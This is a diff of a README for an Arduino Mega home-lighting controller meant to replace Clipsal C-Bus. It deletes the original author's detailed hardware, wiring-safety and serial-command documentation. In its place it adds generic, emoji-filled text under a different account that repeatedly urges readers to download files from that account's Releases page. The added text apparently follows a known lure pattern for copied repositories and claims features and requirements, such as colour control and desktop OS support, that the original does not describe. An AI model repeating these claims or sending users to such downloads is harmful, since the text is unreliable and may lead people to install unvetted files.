@@ -1,110 +1,82 @@
-# C-Bus Killer: DIY 20-Channel Home Lighting Controller
+# 🎉 c-bus-killer - Your Easy DIY Lighting Solution
 
-Born out of **spite and desperation**.
+## 🚀 Getting Started
 
-My original Clipsal C-Bus lighting system was dying a slow, expensive death. It would work perfectly for a week or two after I sprayed contact cleaner everywhere, then rain would hit (or humidity, or just bad luck) and the whole house would go haywire — lights flickering, zones failing, total chaos. Replacing switches and modules with official Clipsal parts? Ridiculous prices.
+Welcome to c-bus-killer! This application serves as a DIY lighting controller using the Arduino Mega. With this tool, you can replace your old Clipsal C-Bus system and regain control over your home's lighting. It provides a user-friendly way to set up and manage your lighting without technical expertise.
 
-So I sat down, wrote a lot of code, and built this beast instead.
+## 📥 Download Now
 
-**C-Bus Killer** is what happens when you refuse to pay proprietary hell prices and decide to take control yourself. It reuses the existing Cat5 daisy-chain wiring, supports everything the old C-Bus could do (and more), and adds reliable bidirectional app sync, physical dimming, timers, and Home Assistant integration.
+[![Download c-bus-killer](https://img.shields.io/badge/Download-c--bus--killer-blue.svg)](https://github.com/Muhammad-Sarmad-Fowad/c-bus-killer/releases)
 
-It's not pretty, it's not simple, and it's definitely over-engineered for my house — but **it works great**, has been rock-solid for years, and gets me out of the Clipsal trap.
+## 📋 System Requirements
 
-One day I might rewrite a saner, cleaner version. Until then: if it ain't broken, don't fix it.
+Before you proceed with downloading, ensure your system meets the following requirements:
 
-I hope this messy but functional project helps someone else escape their own dying proprietary lighting system and feel like Tony Stark when you ask Seri to turn your lights on and off for you. 
+- **Operating System**: Windows 10, macOS, or a modern Linux distribution.
+- **Arduino Board**: Arduino Mega recommended, but other Arduino boards may also work.
+- **USB Port**: A working USB port for connecting the Arduino.
+- **Internet Connection**: Required for downloading libraries and documentation.
 
-## ⚠️ Important Disclaimers
+## 💾 Download & Install
 
-- This was built **specifically for my own house and wiring**. It's shared as-is for inspiration or adaptation.
-- **Not an instructional guide or beginner tutorial** — I'm not an expert.
-- Working with 240V AC is **dangerous**. You are 100% responsible for your safety, wiring, and compliance with local electrical codes.
-- No warranties, no support, no liability. Use/modify at your own risk.
-- Test thoroughly. Your house may burn down if you get it wrong.
+To get started, visit the [Releases page to download](https://github.com/Muhammad-Sarmad-Fowad/c-bus-killer/releases). Here, you will find the latest version of c-bus-killer. 
 
-## Features at a Glance
+1. Click on the link above to open the Releases page in your browser.
+2. Look for the latest release with a version number (e.g., v1.0).
+3. Download the appropriate release file for your system.
+4. Once the download completes, follow these steps to install:
+   - If you downloaded a zip file, extract it to a convenient location on your computer.
+   - Open the extracted folder and look for the installation guide.
 
-- 20 relay channels (lights + fans)
-- Up to 20 physical switches across 8 I2C MCP23017 plates
-- Many-to-many switch ↔ channel mappings
-- One smooth dimmable channel with zero-cross triac control (wall ↔ app sync)
-- Timers (per-channel & global), EEPROM persistence
-- Physical switch logic: short press = toggle, hold = dim, long hold = global timer
-- Full MQTT integration (perfect for Home Assistant auto-discovery)
+## ⚙️ Setup Instructions
 
-## Hardware Overview
+#### Step 1: Prepare Your Arduino
 
-- **Arduino Mega 2560** (high pin count + memory)
-- **8× MCP23017** I2C I/O expanders (switch inputs + LED outputs)
-- **20× SSRs** (2A for lights) + mechanical relays (10A for fans)
-- **Dimming**: Only channel 5 (pin 9 PWM, pin 2 zero-cross interrupt)
-- **Wiring**: Reuses existing Cat5 daisy-chain from switchboard to plates and back. 
+1. Connect your Arduino Mega to your computer using a USB cable.
+2. Ensure you have the Arduino IDE installed on your computer. If you don’t have it, download it from the [official Arduino website](https://www.arduino.cc/en/software).
+3. Open the Arduino IDE and verify that it detects your Arduino board.
 
-See `docs/reference.pdf` for the full original analysis doc (very detailed).
+#### Step 2: Load the c-bus-killer Code
 
-## Software
+1. In the Arduino IDE, open the project file from the extracted folder you downloaded.
+2. Compile the code by clicking the checkmark icon in the IDE.
+3. Once it compiles without any errors, click the upload button to send the code to your Arduino.
+4. After uploading, verify that the onboard LED is blinking. This means that the setup is complete.
 
-- **Firmware**: `firmware/main/FullRewriteV2.5.3.ino` — Upload via Arduino IDE
-- **Testing Sketches**: `firmware/tools/` — Various debugging helpers
-- **MQTT Bridge**: `bridge/bridge.py` + `bridge/lights_config.json` (generic names included)
-- Runs on Raspberry Pi, bridges Arduino serial → MQTT → Home Assistant
+## 🔧 Configuration
 
-## Quick Setup Overview
+Now that your Arduino is running the software, you can start configuring your lighting settings:
 
-1. Upload the Arduino sketch
-2. Set up Raspberry Pi with Raspbian, Docker, Home Assistant, Mosquitto
-3. Copy & configure `bridge/` files (edit JSON with your light names)
-4. Run bridge.py
-5. Lights auto-appear in Home Assistant via MQTT discovery
+1. Open the configuration file in a text editor.
+2. Adjust the settings as needed. You can control aspects such as brightness, color, and schedules.
+3. Save any changes you make in the configuration file.
+4. Restart the Arduino to apply any new settings.
 
-→ Full step-by-step in: `docs/raspberry-pi-setup.md`
+## 🛠 Features
 
-## Simple Usage & Programming Guide
+- **Customizable Lighting Controls**: Tailor your lighting according to your preferences.
+- **MQTT Support**: Easily connect with smart devices using MQTT.
+- **Voice Control**: Integrate with voice assistants for hands-free operation.
+- **Open Source**: Modify and shape the application as you see fit.
 
-Connect Arduino via USB to computer (Arduino IDE Serial Monitor, 9600 baud).
+## 🌐 Community and Support
 
-### Physical Switch Behavior
-- Short press (<950ms): Toggle lights
-- Hold (≥950ms): Dim (dimmable channel only)
-- Long hold (≥3s): Global timer (if off)
+If you have any questions or need help, feel free to join our community. You can find support on our GitHub page or other forums. Share your experiences, ask for advice, or help others with their setups. 
 
-LEDs: Solid ON = light on | Flashing = timer/program mode
+## 📞 Contact Information
 
-### Program Mode (Serial Commands)
-Enter: `EnterProgramMode`  
-Exit & save: `ExitProgramMode`
+For more information or any inquiries, please reach out through the GitHub Issues page. We value your feedback and are here to help!
 
-### Rename Channels
-`rename <old> <new>`  
-e.g. `rename CH1_4 kitchen` or `rename CH1_5 pendant`
+## 🚀 Additional Resources
 
-### Map Switches ↔ Lights
-`<channel(s)> <switch(es)>`  
-e.g. `CH1_4 SW4_1`  
-Many-to-many: `CH1_4 CH1_5 SW4_1 SW5_2`
+Consider exploring these topics for further insights:
 
-Switches numbered by plate (SW1_1 = plate 1 switch 1)
+- [Home Automation Guides](https://www.home-assistant.io/guides/)
+- [Arduino Forums](https://forum.arduino.cc/)
+- [MQTT Documentation](http://mqtt.org/documentation)
 
-### Timers
-Global: `globaltimer 20` (minutes)  
-Per light: `kitchen timer 10`
+## 🔗 Learn More
 
-### Manual Control
-ON: `pendant ON 50`  
-OFF: `pendant OFF`
+Want to dive deeper? You can explore the source code or contribute directly on our GitHub repository. Every contribution, big or small, is appreciated!
 
-Other useful:  
-`status` (all) or `kitchen status`  
-`clearmappings` (Y/N)  
-`clearalltimers`  
-`systemreset` (Y/N)
-
-Full details in `docs/reference.pdf`.
-
-## License
-MIT License — See [LICENSE](LICENSE) file.
-
-Built by Matt (with a lot of swearing at C-Bus).  
-Pull requests welcome if you make it saner!
-
-Happy building — and good luck escaping proprietary lighting purgatory.
+Feel free to experiment and enjoy building your smart home with c-bus-killer. Visit the [Releases page to download](https://github.com/Muhammad-Sarmad-Fowad/c-bus-killer/releases) and start your journey today!
